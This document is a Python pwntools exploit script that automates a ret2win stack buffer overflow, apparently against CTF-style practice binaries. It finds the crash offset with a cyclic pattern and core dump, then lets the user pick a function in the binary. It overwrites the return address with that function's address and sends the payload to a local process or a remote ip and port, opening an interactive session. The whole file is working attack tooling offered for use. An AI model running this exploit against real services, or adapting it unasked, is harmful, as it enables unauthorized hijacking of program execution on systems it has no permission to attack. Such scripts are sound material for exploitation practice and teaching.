#!/usr/bin/python3

from pwn import *
import sys


def find_offset():
    exe = sys.argv[ 1 ]
    print( "[*] Finding offset, sending cyclic..." )
    pattern = cyclic( 300 )
    p = process( exe )
    p.sendline( pattern )
    p.wait()

    core = Coredump( './core' )
    return cyclic_find( core.fault_addr, n = 4 )


def win_local( exe, payload ):
    p = process( exe )
    p.sendline( payload )
    p.interactive()


def win_remote( ip, port, payload ):
    p = remote( ip, port )
    p.sendline( payload )
    p.interactive()


def list_functions( elf ):
    print( "[*] Listing available functions:" )
    for symbol in elf.symbols:
        if len( symbol ) > 0 and symbol[ 0 ] != '_' and '_' not in symbol:
            print( f"func name: {symbol}" )


def create_payload( offset, func_name, elf ):
    addr = elf.symbols[ func_name ]
    print( f"[+] Func addr: {hex(addr)}" )

    payload = flat( { offset: addr } )
    return payload


if __name__ == "__main__":
    if len( sys.argv ) < 3:
        print( f"Usage: {sys.argv[0]} <binary> <local / remote> /optional: <ip> <port>" )
        print( f"- ret2win ./ret2win remote 127.0.0.1 1337" )
        print( f"- ret2win ./ret2win local" )
        exit( 0 )

    if sys.argv[ 2 ] not in [ 'local', 'remote' ]:
        print( f"oi, use 'local' or 'remote' as the second argument" )

    if sys.argv[ 2 ] == 'remote' and len( sys.argv ) < 4:
        print( f"Usage: {sys.argv[0]} <binary> <local / remote> /optional: <ip> <port>" )
        print( f"- ret2win ./ret2win remote 127.0.0.1 1337" )
        print( f"- ret2win ./ret2win local" )

    exe = sys.argv[ 1 ]
    context.binary = exe
    context.log_level = 'error'

    offset = find_offset()

    print( f"[+] Found offset: {offset} bytes\n" )

    elf = ELF( exe )
    list_functions( elf )

    func_name = input( "[?] Which function do you want to call? " )
    if func_name not in elf.symbols:
        print( f"[-] Function '{func_name}' not found in the binary. Exiting." )
        exit( 1 )

    payload = create_payload( offset, func_name, elf )
    print( f"[+] Payload: {payload}" )

    if sys.argv[ 2 ] == 'local':
        win_local( exe, payload )

    elif sys.argv[ 2 ] == 'remote':
        ip = sys.argv[ 3 ]
        port = sys.argv[ 4 ]
        win_remote( ip, port, payload )
